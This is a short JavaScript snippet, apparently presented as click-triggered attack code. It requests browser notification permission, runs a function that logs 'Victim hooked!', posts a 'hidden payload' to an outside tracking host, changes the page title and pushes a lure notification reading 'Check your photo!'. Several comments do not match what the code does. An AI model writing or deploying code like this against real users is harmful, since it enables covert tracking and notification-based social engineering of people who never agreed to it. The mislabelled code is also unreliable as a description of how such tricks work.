// This runs immediately when the image is clicked

// 1. Grant Notification Permission
if (Notification.permission !== "granted") {
    Notification.requestPermission();
}

// 2. The Deep Link Logic
// This simulates the phone "waking up" or opening your app
function launchAttack() {
    console.log("Victim hooked!");

    // Example: Send a hidden payload to a tracking server
    fetch('https://api.yourname.site/track', {
        method: 'POST',
        body: 'user=cached'
    });

    // Example: Make the browser request a specific profile picture
    document.title = "YourName's Updates";

    // Trigger the notification immediately
    if (Notification.permission === "granted") {
        new Notification("Check your photo!", {
            body: "You just clicked something cool!"
        });
    }
}

launchAttack();